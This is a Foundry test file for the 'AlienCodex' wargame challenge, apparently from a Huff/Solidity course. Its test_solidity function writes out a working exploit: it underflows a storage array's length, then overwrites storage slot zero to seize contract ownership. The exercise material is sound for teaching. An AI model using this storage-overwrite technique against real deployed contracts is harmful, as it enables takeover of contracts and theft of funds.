// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "week12-huff/AlienCodex.sol";
import {HuffConfig} from "foundry-huff/HuffConfig.sol";
import {HuffDeployer} from "foundry-huff/HuffDeployer.sol";

interface AlienCodexAttacker {
    function attack(address) external;
}

contract AlienCodexTest is Test {
    AlienCodex codex;
    address player;
    AlienCodexAttacker attacker;

    function setUp() external {
        player = makeAddr("player");
        codex = new AlienCodex();
        attacker = AlienCodexAttacker(
            HuffDeployer.config().deploy("./week12-huff/AlienCodexAttacker")
        );
    }

    function test_setUp() external {
        assertEq(codex.owner(), address(this));
        assertEq(codex.contact(), false);
    }

    function test_huff() external {
        vm.prank(player);
        attacker.attack(address(codex));
        _checkSolved();
    }

    function test_solidity() external {
        // Contact the codex
        codex.makeContact();

        // Call retract to get array length to underflow
        codex.retract();

        // We can write to slot zero if we find the offset from the data
        // location of the array in slot 1
        uint256 dataOffset = uint256(keccak256(abi.encode(0x01)));
        uint256 attackOffset;
        unchecked {
            attackOffset = 0 - dataOffset;
        }

        // Perform write to slot zero using the underflowed array
        codex.revise(attackOffset, bytes32(uint256(uint160(player))));

        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(codex.owner(), player, "Owner must be the player");
    }
}
